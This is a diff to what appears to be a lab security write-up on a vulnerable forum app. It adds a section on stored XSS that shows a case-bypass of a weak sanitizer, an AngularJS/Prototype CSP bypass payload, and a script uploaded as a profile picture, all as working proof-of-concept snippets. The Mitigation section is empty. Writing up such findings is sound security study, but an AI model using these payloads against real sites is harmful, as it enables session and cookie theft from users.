@@ -88,4 +88,54 @@ To make the system more robust one should also mitigate timing attacks. This can
 
 ## XSS
 ### What is XSS?
-XSS (Cross-Site Scripting) is a type of attack that allows an attacker to inject malicious scripts into web pages viewed by other users. 
+XSS (Cross-Site Scripting) is a type of attack that allows an attacker to inject malicious scripts into web pages viewed by other users. It happens when a web application trusts user input and includes it in the response without proper validation or sanitization.
+
+### Exploit
+
+The first XSS vulnerability we found was when we create new threads in the forums. In `forum.js`, we save the content of the body to the database without any santization or validation. When the thread is displayed, there is a weak sanitization step, which we can easily bypass by changer the capitalisation of our script tag. 
+
+```js
+thread.body = thread.body
+    .replace('<script', '')
+    .replace('<img', '')
+    .replace('<svg', '')
+    .replace('javascript:', '')
+```
+In the template for theads, replies are not rendered as html, but thread bodies are:
+
+```html
+<p style="white-space: pre-wrap; overflow-wrap: break-word;" class="lead">{{{ thread.body }}}</p>
+```
+
+After this, the script tag is executed in the browser, and the attacker can do whatever they want with it. But, we still need to deal with the CSP, which blocks inline scripts. To bypass this, we use a few vulnerable libraries from trusted sources, in our case `angular.js` and `prototype.js`, both from `cdnjs.cloudflare.com`. We then use a known angularjs CSP bypassing technique to execute our script:
+
+```html
+<SCRIPT src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></SCRIPT>
+<SCRIPT src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></SCRIPT>
+<div ng-app ng-csp>
+    {{$on.curry.call().console.log("XSS executed")}}
+</div>
+```
+
+In our case above, we simply log to the console, but an attacker could do whatever they want with it, like steal cookies, session tokens, etc.
+
+The second XSS vulnerability was using the profile picture uploading functionality. Profile picture files have no filetype validation, so an attacker can upload a file with a malicious script in it. The server saves the file without any extension. We can then reference the profile "picture" in a thread body, and the script will be executed when the thread is displayed. 
+
+Our profile pic file is the following:
+
+```js
+console.log("XSS executed via file upload!");
+// More malicious code here
+```
+
+Our thread body is:
+
+```html
+<SCRIPT src="/images/profileImages/hello"></SCRIPT>
+```
+
+Since the file is saved on the server, it bypasses the CSP, and the script is executed in the browser.
+
+### Mitigation
+
+
